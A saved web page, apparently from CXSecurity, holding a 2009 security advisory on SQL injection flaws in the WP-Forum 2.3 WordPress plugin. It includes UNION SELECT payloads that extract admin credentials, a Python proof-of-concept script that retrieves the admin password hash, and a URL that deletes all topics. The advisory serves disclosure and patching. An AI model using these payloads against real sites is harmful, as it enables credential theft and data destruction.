@@ -1,0 +1,490 @@
+	
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML lang="en">
+<HEAD>
+<META http-equiv="Content-Type" content="text/html; charset=utf-8">
+<TITLE>WP-Forum &lt;= 2.3 SQL Injection vulnerabilities - CXSecurity.com</TITLE>
+<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<META name="keywords" content="WP-Forum, &lt;=, 2.3, SQL, Injection, vulnerabilities, exploit, vulnerability, bug, issue, advisories">
+<META name="description" content="ISecAuditors has realised a new security note WP-Forum &lt;= 2.3 SQL Injection vulnerabilities ">
+<META name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<META name="mobile-web-app-capable" content="yes">
+<LINK rel="Icon" href="https://cert.cx/cxstatic/favicon.ico" type="image/x-icon">
+<script type="text/javascript" src="https://cert.cx/cxstatic/js/m-jq.js?T"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+<script type="text/javascript" src="https://cert.cx/cxstatic/js/m.js?V"></script>
+<link href="https://cert.cx/cxstatic/css/b.css?E" rel="stylesheet" type='text/css'/>
+</HEAD>
+<script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-39628967-1']);
+_gaq.push(['_trackPageview']);
+(function() {
+var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script><BODY ng-app="ui.bootstrap.demo">
+<div class="navbar navbar-default navbar-fixed-top" id="frezz">
+<div class="container"><div class="navbar-header"><a class="navbar-brand" href="https://cxsecurity.com/"><IMG SRC="https://cert.cx/cxstatic/images/l0g0/gw6.png" width="150" height="20" ALT="Home Page"></a><button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button></div><div class="navbar-collapse collapse" id="navbar-main" ><ul class="nav navbar-nav">
+          <li><a href="https://cxsecurity.com/">Home</a></li><li class="active">
+<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Bugtraq<span class="caret"></span></a>
+<ul class="dropdown-menu" role="menu">
+<li><a href="https://cxsecurity.com/wlb/">Full List</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/bugs/">Only Bugs</a></li>
+<li><a href="https://cxsecurity.com/tricks/">Only Tricks</a></li>
+<li><a href="https://cxsecurity.com/exploit/">Only Exploits</a></li>
+<li><a href="https://cxsecurity.com/dorks/">Only Dorks</a></li>
+<li><a href="https://cxsecurity.com/cvelist/">Only CVE</a></li>
+<li><a href="https://cxsecurity.com/cwelist/">Only CWE</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/bogus/">Fake Notes</a></li>
+</ul></li>
+<li class="dropdown">
+<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">CVEMAP<span class="caret"></span></a>
+<ul class="dropdown-menu" role="menu">
+<li><a href="https://cxsecurity.com/cvemap/">Full List</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/cvevendors/">Show Vendors</a></li>
+<li><a href="https://cxsecurity.com/cveproducts/">Show Products</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/allcwe/">CWE Dictionary</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/cve/">Check CVE Id </a></li>
+<li><a href="https://cxsecurity.com/cwe/">Check CWE Id</a></li>
+</ul></li>
+<li class="dropdown">
+<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Search<span class="caret"></span></a>
+<ul class="dropdown-menu" role="menu">
+<li><a href="https://cxsecurity.com/search/">Bugtraq</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/search/cve/">CVEMAP</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/search/author/">By author</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/cve/">CVE Id</a></li>
+<li><a href="https://cxsecurity.com/cwe/">CWE Id</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/cvevendors/">By vendors</a></li>
+<li><a href="https://cxsecurity.com/cveproducts/">By products</a></li>
+</ul></li>
+<li class="dropdown">
+<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">RSS<span class="caret"></span></a>
+<ul class="dropdown-menu" role="menu">
+<li><a href="https://cxsecurity.com/wlb/rss/all/">Bugtraq</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/cverss/fullmap/">CVEMAP</a></li>
+<li><a href="https://cxsecurity.com/cveproducts/">CVE Products</a></li>
+    <li class="divider"></li>
+<li><a href="https://cxsecurity.com/wlb/rss/vulnerabilities/">Bugs</a></li>
+<li><a href="https://cxsecurity.com/wlb/rss/exploit/">Exploits</a></li>
+<li><a href="https://cxsecurity.com/wlb/rss/dorks/">Dorks</a></li>
+</ul></li>
+<li class="dropdown">
+<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">More<span class="caret"></span></a>
+<ul class="dropdown-menu" role="menu">
+<li><a href="http://cifrex.org/">cIFrex</a></li>
+<li class="divider"></li>
+<li><a href="https://www.facebook.com/cxsec">Facebook</a></li>
+<li><a href="https://twitter.com/cxsecurity">Twitter</a></li>
+<li class="divider"></li>
+<li><a href="https://cxsecurity.com/wlb/about/">About</a></li>
+</ul></li>
+</ul>
+<ul class="nav navbar-nav navbar-right">
+<li><a href="https://cxsecurity.com/wlb/add/">Submit</a></li>
+</ul></div></div></div>
+<div id="general"><TABLE width="100%"><TR><TD width="6%"></TD><TD id="boki"></TD><TD id='glowna'><CENTER>
+<script src="https://www.google.com/recaptcha/api.js?onload=CaptchaCallback&render=explicit" async defer></script>
+<script type="text/javascript">
+        var CaptchaCallback = function() {
+            var recap1 = grecaptcha.render('Recaptcha1', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'setComIt'});
+            var recap2 = grecaptcha.render('Recaptcha2', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'onSubmit'});
+        };
+    </script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular-sanitize/1.6.6/angular-sanitize.min.js"></script>
+<script type="text/javascript" src="https://cxsecurity.com/js/show.js"></script>
+<TABLE cellpadding="0" cellspacing="0" width="100%"><TR><TD>
+<DIV ng-non-bindable><CENTER><h4><B>WP-Forum &lt;= 2.3 SQL Injection vulnerabilities</B></h4>
+<div class="panel panel-default""><div class="panel-body"><div class="container"><div class="row">
+<div class="col-xs-12 col-md-3"><div class="well well-sm"><b>2009-12-18 / 2009-12-19</b></div></div>
+<div class="col-xs-12 col-md-6"><div class="well well-sm"><U>Credit:</U> <b><A HREF="https://cxsecurity.com/search/author/DESC/AND/FIND/0/10/ISecAuditors/">ISecAuditors</a></b>
+</div></div><div class="col-xs-5 col-md-3"><div class="well well-sm">
+  <U>Risk:</U> <b>
+<span class="label label-warning">Medium</span></b>
+</div></div><div class="col-xs-3 col-md-3"><div class="well well-sm">
+  <U>Local:</U> <b>No</b>
+</div></div><div class="col-xs-4 col-md-3"><div class="well well-sm">
+  <U>Remote:</U> <b><B>Yes</B></span></b>
+</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
+  <U>CVE:</U> <b><A href="https://cxsecurity.com/cveshow/CVE-2009-3703/" title="Click to see CVE-2009-3703" style="text-decoration: none;">CVE-2009-3703</A></b>
+</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
+  <U>CWE:</U> <b><A href="https://cxsecurity.com/cwe/CWE-98" title="Click to see CWE-98" style="text-decoration: none;">CWE-98</A> </b></div></div></div><P><TABLE width="70%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5074670963595353"
+     data-ad-slot="9692700437"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></TD></TR>
+</TABLE><P><BR><div class="well well-sm"><div class="container">
+<div class="row">
+<div class="col-xs-6 col-md-4 nopadding">
+CVSS Base Score: <font color="#b2b2b2"><b>7.5/10</b></font>
+</div><div class="col-xs-6 col-md-4 nopadding">
+Impact Subscore: <font color="#b2b2b2"><b>6.4/10</b></font>
+</div><div class="col-xs-6 col-md-4 nopadding">
+Exploitability Subscore: <font color="#b2b2b2"><b>10/10</b></font>
+</div><div class="col-xs-6 col-md-4 nopadding">
+Exploit range: <font color="#b2b2b2"><b>Remote</b></font>
+</div><div class="col-xs-6 col-md-4 nopadding">
+Attack complexity: <font color="#b2b2b2"><b>Low</b></font>
+</div><div class="col-xs-6 col-md-4 nopadding">
+Authentication: <font color="#b2b2b2"><b>No required</b></font>
+</div><div class="col-xs-6 col-md-4 nopadding">
+Confidentiality impact: <font color="#b2b2b2"><b>Partial</b></font>
+</div><div class="col-xs-6 col-md-4 nopadding">
+Integrity impact: <font color="#b2b2b2"><b>Partial</b></font>
+</div><div class="col-xs-6 col-md-4 nopadding">
+Availability impact: <font color="#b2b2b2"><b>Partial</b></font>
+</div></div></div></CENTER></div></div></div><P><DIV style="white-space: pre-wrap; word-break: break-all;" ng-non-bindable><div class="well well-sm premex">=============================================
+INTERNET SECURITY AUDITORS ALERT 2009-010
+- Original release date: September 28th, 2009
+- Last revised: December 15th, 2009
+- Discovered by: Juan Galiana Lara
+- CVE ID: CVE-2009-3703
+- Severity: 8.5/10 (CVSS Base Score)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+WP-Forum &lt;= 2.3 SQL Injection &amp; Blind SQL Injection vulnerabilities
+
+II. BACKGROUND
+-------------------------
+WP-Forum is a discussion forum plugin for WordPress. It works with
+WordPress 2+ version and PHP &gt;= 5.0
+
+III. DESCRIPTION
+-------------------------
+WP-Forum fails to sanitized user supplied input and is vulnerable to
+SQL Injection and Blind SQL Injection. An attacker can obtain any data
+of the database including user logins and password&#039;s of the WordPress
+installation, allowing him to obtain access to the application and
+gain administration privileges.
+
+For the SQL Injection vulnerability, is possible to concatenate other
+sql requests via &quot;union select&quot; sentence. The parameters &quot;search_max&quot;
+and &quot;forum&quot; are affected by this flaw.
+
+Snippet of vulnerable code:
+
+In wpf.class file:
+
+1836     $option_max_days = $_POST[&#039;search_max&#039;];       // &lt;- this
+line is not being sanitized
+1837     $option_forums = $_POST[&#039;forum&#039;];
+1838     if(!$option_max_days)
+1839              $option_max_days = 9999;
+1840     $op .= &quot; AND $this-&gt;t_posts.`date` &gt; SUBDATE(CURDATE(),
+INTERVAL $option_max_days DAY) &quot;;
+1841
+...
+1850     foreach((array)$option_forums as $f)
+1851             $a .= $f.&quot;,&quot;;    // &lt;- &lt;- this lines is not being
+sanitized
+1852
+1853     $a = substr($a, 0, strlen($a)-1 );
+1854     if(!$a)
+1855             $w = &quot;&quot;;
+1856     else
+1857             $w = &quot;IN($a)&quot;;
+1858
+1859     $sql = &quot;SELECT $this-&gt;t_threads.parent_id as pt,
+$this-&gt;t_posts.id, text, $this-&gt;t_posts.subject,
+$this-&gt;t_posts.parent_id, $this-&gt;t_posts.`date`, MATCH ($what) AGAINST
+(&#039;$search_string&#039;) AS score
+1860     FROM $this-&gt;t_posts inner join $this-&gt;t_threads on
+$this-&gt;t_posts.parent_id = $this-&gt;t_threads.id
+1861     WHERE $this-&gt;t_threads.parent_id  $w
+1862     AND MATCH (text) AGAINST (&#039;$search_string&#039;) $op&quot;;
+
+In the case of the Blind SQL Injection, the vulnerable code is...
+
+In wpf-post.php file:
+
+57     $id = $_GET[&#039;id&#039;]; // &lt;- $_GET[&#039;id&#039;] is directly assigned
+ 58     $thread = $this-&gt;check_parms($_GET[&#039;t&#039;]);
+ 59
+ 60             $out .= $this-&gt;header();
+ 61
+ 62     $post = $wpdb-&gt;get_row(&quot;SELECT * FROM $wpforum-&gt;t_posts WHERE
+id = $id&quot;); // &lt;- id is used without clean up
+
+other example:
+
+1490     function remove_post(){
+1491             global $user_level, $user_ID, $wpdb;
+1492             $id = $_GET[&#039;id&#039;]; // &lt;- $_GET[&#039;id&#039;] is directly assigned
+1493             $author = $wpdb-&gt;get_var(&quot;SELECT author_id from
+$this-&gt;t_posts where id = $id&quot;); // id is used without clean up
+...
+1503             if($del == &quot;ok&quot;){
+1504                 $wpdb-&gt;query(&quot;DELETE FROM $this-&gt;t_posts WHERE id
+= $id&quot;); &lt;- // id is used without clean up
+1505                 $this-&gt;o .= &quot;&lt;div class=&#039;updated&#039;&gt;&quot;.__(&quot;Post
+deleted&quot;, &quot;wpforum&quot;).&quot;&lt;/div&gt;&quot;;
+1506             }
+1507             else
+1508                 wp_die(__(&quot;Cheating, are we?&quot;, &quot;wpforum&quot;));
+1509
+1510     }
+
+the &quot;id&quot; parameter is vulnerable in other parts of the source code..
+
+Also, is possible to delete all records in table $this-&gt;t_posts and
+$this-&gt;t_threads because $_GET[&#039;topic&#039;] is not properly sanitized,
+injecting something like 1 or 1=1
+
+1479     function remove_topic(){
+1480             global $user_level, $user_ID, $wpdb;
+1481             $topic = $_GET[&#039;topic&#039;];
+1482             if($this-&gt;is_moderator($user_ID, $this-&gt;current_forum)){
+1483                 $wpdb-&gt;query(&quot;DELETE FROM $this-&gt;t_posts WHERE
+parent_id = $topic&quot;);
+1484                 $wpdb-&gt;query(&quot;DELETE FROM $this-&gt;t_threads WHERE
+id = $topic&quot;);
+1485             }
+1486             else
+1487                 wp_die(__(&quot;Cheating, are we?&quot;, &quot;wpforum&quot;));
+1488
+1489     }
+
+IV. PROOF OF CONCEPT
+-------------------------
+In the url: http://example.com/blog/?page_id=3&amp;wpforumaction=search
+replacing &#039;page_id=3&#039; parameter with the number of the WP-Forum page
+in each case
+
+Is possible to obtain any data of the database. Here is a proof of
+concept to obtain user_pass, user_login and user_email of the user
+with id=1 of wp_users table (normally admin).
+
+We have to fill the search_max parameter with the value:
+
+9999 DAY) union select 1,1,1,user_pass,1,1,1 from wp_users where id=1
+and subdate(curdate(), interval 9999
+9999 DAY) union select 1,1,1,user_login,1,1,1 from wp_users where id=1
+and subdate(curdate(), interval 9999
+9999 DAY) union select 1,1,1,user_email,1,1,1 from wp_users where id=1
+and subdate(curdate(), interval 9999
+
+I wrote a PoC, to get automatically the password hash of the WordPress
+admin account:
+
+user@linuz:~$ cat wpforum2.3-poc.py
+#!/usr/bin/python
+
+# WP-Forum &lt;= 2.3 SQL Injection PoC
+# Juan Galiana Lara
+# Internet Security Auditors
+
+import urllib
+import urllib2
+import re
+
+url = &#039;http://site//wordpress/?page_id=3&amp;wpforumaction=search&#039;
+values = {&#039;search_words&#039; : &#039;any&#039;,
+          &#039;search_submit&#039; : &#039;Search&#039;,
+          &#039;search_max&#039; : &#039;999 DAY) union select 1,1,1,user_pass,1,1,1
+from wp_users where id=1 or SUBDATE(CURDATE(), INTERVAL 9999&#039; }
+
+data = urllib.urlencode(values)
+req = urllib2.Request(url, data)
+response = urllib2.urlopen(req)
+output = response.read()
+o = re.search(&#039;viewtopic.+&gt;([$].+)&lt;&#039;,output)
+if o:
+	print o.group(1)
+
+user@linuz:~$ python wpforum2.3-poc.py
+$P$Bn8oMY.T3kHELf/lnn07L3HXgID4go/
+user@linuz:~$
+
+That&#039;s it!
+
+For the blind sql injection, here are some examples:
+
+http://example.com/blog/?page_id=3&amp;wpforumaction=editpost&amp;id=1%20and%201
+=0&amp;t=.0
+http://example.com/blog/?page_id=3&amp;wpforumaction=editpost&amp;id=1%20and%201
+=1&amp;t=.0
+
+http://example.com/blog/?page_id=3&amp;wpforumaction=viewforum&amp;f=2.0&amp;delete_
+topic&amp;topic=3%20and%201=0
+http://example.com/blog/?page_id=3&amp;wpforumaction=viewforum&amp;f=2.0&amp;delete_
+topic&amp;topic=3%20and%201=1
+
+http://example.com/blog/?page_id=3&amp;wpforumaction=viewtopic&amp;t=1.0&amp;sticky&amp;
+id=1%20and%201=0
+http://example.com/blog/?page_id=3&amp;wpforumaction=viewtopic&amp;t=1.0&amp;sticky&amp;
+id=1%20and%201=1
+
+Is possible to delete all topics, injecting sql code in &quot;topic&quot; parameter:
+
+http://example.com/blog/?page_id=3&amp;wpforumaction=viewforum&amp;f=1.0&amp;delete_
+topic&amp;topic=5%20or%201=1
+
+V. BUSINESS IMPACT
+-------------------------
+Unauthenticated users can obtain or delete any data of the database.
+This flaw could result in get access to WordPress accounts including
+the administrator one.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+WP-Forum &lt;= 2.3 are vulnerable.
+
+VII. SOLUTION
+-------------------------
+Update to version 2.4.
+
+VIII. REFERENCES
+-------------------------
+http://www.fahlstad.se/wp-plugins/wp-forum/
+http://www.wordpress.org/
+http://www.isecauditors.com/
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered by
+Juan Galiana Lara (jgaliana (at) isecauditors (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+September  28, 2009: Initial release.
+October    13, 2009: Review.
+October    19, 2009: Added CVE id.
+December   15, 2009: Last revision.
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+September  28, 2009: Vulnerability discovered
+                     by Internet Security Auditors.
+October    13, 2009: Sent to developers. No response.
+December   13, 2009: Contact again. Response about its correction.
+December   14, 2009: New version published.
+December   15, 2009: Advisory released to lists.
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied &quot;as-is&quot;
+with no warranties or guarantees of fitness of use or otherwise.
+Internet Security Auditors accepts no responsibility for any damage
+caused by the use or misuse of this information.
+
+</DIV></P><P class="txt" id="refer"></P></DIV><div class="panel panel-default"">
+ <div class="panel-body"><div class="well well-sm"><b><h5><U>References:</U></h5></b><P class="txt"><DIV ng-non-bindable> <DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://www.securityfocus.com/bid/37357', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://www.securityfocus.com/bid/37357</DIV>
+<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://www.securityfocus.com/archive/1/archive/1/508504/100/0/threaded', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://www.securityfocus.com/archive/1/archive/1/508504/100/0/threaded</DIV></DIV><BR></div><CENTER><TABLE width="75%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5074670963595353"
+     data-ad-slot="6599633238"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></TD></TR></TABLE>
+<BR>
+<div class="container"><div class="row">
+<div class="col-xs-12 col-md-6"><div class="well well-sm">
+<CENTER><A HREF="https://cxsecurity.com/ascii/WLB-2009120147"><FONT SIZE="4"><b>See this note in RAW Version</b></FONT></A></CENTER></div></div>
+<div class="col-xs-6 col-md-3"><div class="well well-sm">
+<a href="https://twitter.com/share" class="twitter-share-button" data-count="none">Tweet</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script></div></div>
+<div class="col-xs-6 col-md-3"><div class="well well-sm">
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+var js, fjs = d.getElementsByTagName(s)[0];
+if (d.getElementById(id)) return;
+js = d.createElement(s); js.id = id;
+js.src = "//connect.facebook.net/pl_PL/sdk.js#xfbml=1&version=v2.3";
+fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+<div class="fb-like" data-href="https://cxsecurity.com/issue/WLB-2009120147" data-width="50" data-layout="button" data-action="like" data-show-faces="false" data-share="false"></div></div></div>
+<div class="col-xs-12 col-md-12"><div class="well well-sm">
+<div class="container">
+<div class="group-form inline">
+<div class="col-sm-12 col-md-6" valign="middle">
+Vote for this issue:
+<input type="hidden" id="numberWlb" value="2009120147">
+<button type="button" id="dodatnie" class="btn btn-success glyphicon glyphicon-thumbs-up" data-loading-text=" ... "  data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" value="0">         0</button>
+<button type="button" id="ujemne" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" value="0">       0</button>
+</div>
+<div class="col-sm-11 col-md-5" valign="middle" id="barr">
+<div class="progress progress-striped" style="margin-top: 11px;" >
+<div class="progress-bar progress-bar-success active" id="dodatnieBar" data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" style="width: 50%"><div id="valGreBar">50%</div></div>
+<div class="progress-bar progress-bar-danger active" id="ujemneBar" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" style="width: 50%"><div id="valRedBar">50%</div></div>
+</div></div></div></div>
+<div id="voteCaptcha" class="collapse">
+<BR><div class="g-recaptcha" id="Recaptcha2"></div>
+</div>
+<div id="thanksVote">
+<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
+<h4><strong>Thanks for you vote!</strong></h4></div>
+</div>
+<div id="thanksComm">
+<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
+<h4><strong>Thanks for you comment!</strong><br>Your message is in quarantine 48 hours.</h4></div>
+</div></CENTER></div></div></div>
+<div id="cWlb">
+<div class="well well-sm"><input name="wlb" value="2009120147" type="hidden">
+<fieldset>
+<legend>Comment it here.</legend>
+<div class="form-group form-horizontal">
+<label for="inputNick" class="col-lg-1 control-label">Nick (*)</label>
+<div class="col-lg-11"><input name="n" class="form-control" id="inputNick" placeholder="Nick" style="background-color: black;" onchange="document.getElementById('commCaptcha').style.display='block';"></div></div>
+<div class="form-group form-horizontal">
+<label for="inputEmail" class="col-lg-1 control-label">Email (*)</label>
+<div class="col-lg-11"><input name="e" class="form-control" id="inputEmail" placeholder="Email" style="background-color: black;"></div></div>
+<div class="form-group form-horizontal">
+<label for="inputYoutube" class="col-lg-1 control-label">Video </label>
+<div class="col-lg-11"><input name="v" class="form-control" id="inputVideo" placeholder="Link to Youtube" style="background-color: black;"></div></div>
+<div class="form-group form-horizontal">
+<label for="textArea" class="col-lg-1 control-label">Text (*)</label>
+<div class="col-lg-11">
+<textarea name="c" class="form-control" rows="6" id="inputComment" style="background-color: black;"></textarea></div></div>
+<div class="form-group form-horizontal">
+<div class="col-lg-12" id="commCaptcha" class="collapse"><BR>
+<CENTER><div id="Recaptcha1"></div><BR>
+<small>(*) - <cite title="requi">required fields. </cite></small> &nbsp;
+<button type="reset" class="btn btn-default" style="background-color: transparent; margin-left: 0px; margin-right: 0px;">Cancel</button>
+<button type="submit" id="wysl"  style="background-color: black; margin-left: 0px; margin-right: 0px;" class="btn btn-default" onclick="comIt()">Submit</button>
+</CENTER>
+</div></div></fieldset></div></div>
+<div ng-app="ui.bootstrap.demo" ng-controller="myCtrl">
+<div ng-repeat="x in comments">
+<div class="well well-sm">
+<table width="100%"><TR><TD width="7%"><div ng-bind-html="x.video"></div></TD><TD style="max-width: 100%;overflow: visible;"><div align="left" class="breakcx" id="breakcx"><U><b>{{ x.nick }}</b></U> <img width="20" height="14" src="https://cxsecurity.com/images/flags/{{ x.country }}.png"> | <U>Date:</U> {{ x.ux  * 1000 | date:'yyyy-MM-dd' }} <I>{{ x.ux  * 1000 | date:'HH:mm' }}</I> CET+1<HR style="padding: 0px; margin: 5px;"><DIV style="white-space: pre-wrap;">{{ x.comment }}</DIV>
+</div>
+</TD></TR></table>
+</div>
+</div><button type="button" id="shomor" class="btn btn-link btn-block" ng-click="getNextCom()">Show all comments</button></div></div></div></CENTER>
+</TD></TR></TABLE>
+<script>
+$("#thanksComm").hide(); $("#cWLb").hide(); $("#thanksVote").hide(); $("#commCaptcha").hide();
+if (localStorage.vote2009120147==1) {             
+document.getElementById('voteCaptcha').style.display = 'none'; document.getElementById("dodatnie").disabled = true; document.getElementById("ujemne").disabled = true;
+ }</script><HR>
+Copyright <b>2017</b>, cxsecurity.com<P>&nbsp;
+    </TD>
+    <TD id='boki'></TD>
+    <TD width="6%"></TD>
+	</TR>
+</TABLE>
+<a href="#" class="back-to-top">Back to Top</a>
+    </DIV>
+    </DIV>
+</BODY>
+</HTML>
